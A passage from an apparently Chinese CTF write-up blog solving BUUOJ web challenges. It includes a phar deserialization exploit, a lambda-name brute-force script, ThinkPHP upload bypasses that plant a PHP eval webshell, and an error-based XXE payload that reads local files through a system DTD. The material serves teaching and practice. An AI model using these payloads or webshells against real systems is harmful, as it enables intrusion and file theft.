punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"echo '&lt;br>&lt;br>Master, I want to study rizhan!&lt;br>&lt;br>';"</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>                <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[^a-z0-9]"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('illegal filename!');"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('you are too big (′▽`〃)');"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"move_uploaded_file('"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>                <span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>                <span class="token comment">// return $sandbox.$this->Filename.$ext;</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Filename</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"die('check token falied!');"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uploader</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"下面是你上传的文件：&lt;br>"</span><span class="token operator">.</span><span class="token variable">$uploader</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处有一个file_get_contents存在phar反序列化，任意上传文件可以拿到<code>$_SESSION[&#39;user&#39;]</code>，然后构造exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Uploader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$upload</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"highlight_file('/var/www/html/flag.php');"</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GXY380513e563f39abb95bd589a6d2648ec'</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传后将name参数改为<code>phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt</code>刷新即可拿flag</p>        <h2 id="SUCTF-2018-annonymous"   >          <a href="#SUCTF-2018-annonymous" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2>      <p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建无名函数</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//生成随机数</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function SUCTF_<span class="token interpolation"><span class="token variable">$hash</span></span>()&#123;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"global \$MY;"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"\$MY();"</span>    <span class="token operator">.</span><span class="token string double-quoted-string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//给了无名函数一个名字，但是是随机的</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)</p></blockquote><p>通过上面这个方法，用个脚本就能跑出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/?func_name=%00lambda_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="RoarCTF-2019-Simple-Upload"   >          <a href="#RoarCTF-2019-Simple-Upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> <span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>         <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>                  <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实例化上传类 </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// 设置附件上传大小 </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传类型 </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传目录 </span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">// 设置附件上传子目录 </span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 上传错误提示错误信息 </span>          <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// 上传成功 获取上传文件信息 </span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token operator">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savepath'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>           <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token operator">=></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"success"</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1、看源码可以看出来是thinkphp的文件上传，代码中过滤了php文件后缀，而在thinkphp中文件上传的时候会对文件名进行这样的处理</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里将&lt;>标签删掉</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span>    <span class="token operator">=</span>   <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token comment">/* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>   <span class="token operator">=</span>   <span class="token function">finfo_file</span> <span class="token punctuation">(</span> <span class="token variable">$finfo</span> <span class="token punctuation">,</span>  <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以构造如下的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/index.php/home/index/upload"</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.&lt;>php'</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_GET['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、think PHP里的upload()函数在不传参的情况下是批量上传的，所以如果上传多个文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此处name即为数组，可直接绕过</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  requestsurl <span class="token operator">=</span> <span class="token string">"http://f2d454a6-807f-4da4-9815-e366f39612d8.node4.buuoj.cn:81/index.php/home/index/upload"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>files2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file[]'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_GET['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files <span class="token operator">=</span> files<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续往下走，发现虽然php文件确实上传成功了，但是并没有返回文件名，看前后两个文件重命名后的内容发现文件名的生成是有规律的，了解后知道文件名是通过uniqid得到的，这是根据当前时间来得到的随机数，那么根据前后两个文件名不同的位置进行爆破即可</p>        <h2 id="GoogleCTF2019-Quals-Bnv"   >          <a href="#GoogleCTF2019-Quals-Bnv" class="heading-link"><i class="fas fa-link"></i></a><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2>      <p>选择城市并且进行submit时会向api发送一个json格式的post请求，这里其实就有可能存在XXE注入</p><p>在burp中尝试通过xml方式传入原始数据，提示未发现&lt;标签</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png"></p><p>按照xml格式构造内容提示没有DTD</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png"></p><p>那我们在放一个DTD进去，提示有未声明的元素消息</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png"></p><p>此处类似于在使用变量前要先对变量进行声明，我们只需要声明一下message元素即可，此时回显正常</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png"></p><p>那么下一步我们就要想如何构造才能让flag回显，我们先看是否能读取本地文件，提示文件虽然存在但并不是一个格式良好的xml文件，所以加载中断了，将/flag传入发现回显相同，说明flag文件存在，但是我们怎么读取呢？</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png"></p><p>一个利用本地DTD来XXE输出任何文件内容的小<span class="exturl"><a class="exturl__link"   href="https://mohemiv.com/tags/xxe/" >trick</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>本质上我们可以使用本地DTD文件的实体，但是我们需要在完全加载它之前对它进行定义</p><p>而且Linux设备可能在/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd中有一个DTD文件。并且这个文件又一个名为ISOamsa的实体，所以我们可以使用它来写DTD代码。现在我们来制作DTD代码。</p></blockquote><p>所以我们首先尝试放入一个错误的文件位置，可以看到文件名被回显出来了</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png"></p><p>所以我们要做的就是构造DTD代码使得读取的文件名是我们实际要读取的文件的内容，使得报错导致实际读取的文件内容被放入虚假的文件名中被爆出</p><p>大佬构造出的xml如下</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;aaaaa&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;        &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;        &lt;!ENTITY % eval &quot;&lt;!ENTITY % error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;jlan&#x2F;%file;&#39;&gt;&quot;&gt;        %eval;        %error;    &#39;&gt;    %local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="GWCTF-2019-mypassword"   >          <a href="#GWCTF-2019-mypassword" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2>      